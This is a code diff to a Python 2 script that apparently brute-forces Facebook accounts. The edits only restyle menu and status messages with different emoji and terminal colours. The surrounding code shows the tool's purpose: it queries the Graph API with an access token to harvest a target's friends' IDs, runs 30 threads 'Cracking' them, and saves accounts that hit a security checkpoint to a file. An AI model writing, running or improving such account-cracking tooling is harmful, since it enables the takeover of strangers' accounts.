@@ -195,8 +195,8 @@ def menu():
 	os.system("clear")
 	print logo
 	print "\033[1;96m«--------------------✧--------------------»"
-	print "\033[1;96m[\033[1;97👤\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
-	print "\033[1;96m[\033[1;97👤\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
+	print "\033[1;96m👤\033[1;93m Name\033[1;93m: \033[1;92m"+nama+"\033[1;97m               "
+	print "\033[1;96m👤\033[1;93m ID\033[1;93m: \033[1;92m"+id+"\x1b[1;97m              "
 	print "\033[1;96m«--------------------✧--------------------»"
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Hacking With OMI"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
@@ -241,7 +241,7 @@ def super():
 def pilih_super():
 	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if peak =="":
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
+		print "\033[1;96m✘\x1b[1;91mFill in correctly"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
@@ -255,17 +255,17 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		print "\033[1;96m=«--------------------✧--------------------»"
-		idt = raw_input("\033[1;96m👤\033[1;93mEnter ID \033[1;91m: \033[1;97m")
+		print "\033[1;96m«--------------------✧--------------------»"
+		idt = raw_input("\033[1;96m🔊\033[1;93mEnter ID \033[1;91m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m👤\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
+			print"\033[1;96m👤\033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
 			print"\033[1;96m✘\x1b[1;91mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		jalan('\033[1;96m👤\033[1;93mGetting IDs \033[1;97m...')
+		jalan('\033[1;96m✔\033[1;93mGetting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -289,12 +289,12 @@ def pilih_super():
 		pilih_super()
 	
 	print "\033[1;96m👤\033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
-	jalan('\033[1;96m👤\033[1;93mStarting \033[1;97m...')
+	jalan('\033[1;96m✔\033[1;93mStarting \033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[\033[1;97m👤\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m✔\033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m✘\x1b[1;93mTo Stop Process Press CTRL Then Press Z')
+	print('\x1b[1;93m✘\x1b[1;93mTo Stop Process Press CTRL Then Press Z')
 	print "\033[1;96m«--------------------✧--------------------»"
 	
 			
@@ -415,9 +415,9 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;96m«--------------------✧--------------------»"
-	print '\033[1;96m[\033[1;97m👤\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
+	print '\033[1;96m✔\033[1;92mProcess Has Been Completed \033[1;97m....'
+	print"\033[1;96m✔\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
+	print("\033[1;96m✔\033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 
